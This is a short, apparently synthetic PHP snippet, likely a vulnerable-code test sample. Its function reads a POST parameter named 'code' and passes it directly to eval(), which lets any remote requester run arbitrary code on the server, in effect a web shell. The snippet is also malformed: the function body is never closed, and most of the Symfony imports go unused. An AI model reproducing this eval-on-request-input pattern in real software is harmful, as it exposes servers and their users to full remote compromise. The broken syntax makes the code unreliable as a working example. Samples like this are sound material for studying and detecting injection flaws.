
<?php

use Symfony\Bundle\FrameworkBundle\Controller\AbstractController;
use Symfony\Component\HttpFoundation\Request;
use Symfony\Component\Routing\Annotation\Route;

use Symfony\Component\HttpClient\HttpClient;
use Symfony\Component\HttpClient\HttpClientInterface;

use Symfony\Component\Form\Form;
use Symfony\Component\Form\Forms;
use Symfony\Component\Form\Extension\Core\Type\TextType;


function new_http_param() {
    $r = new Request(
        $_GET,
        $_POST,
        [],
        $_COOKIE,
        $_FILES,
        $_SERVER
    );
    $code = $r->request->get("code");
    eval($code); 


?> 
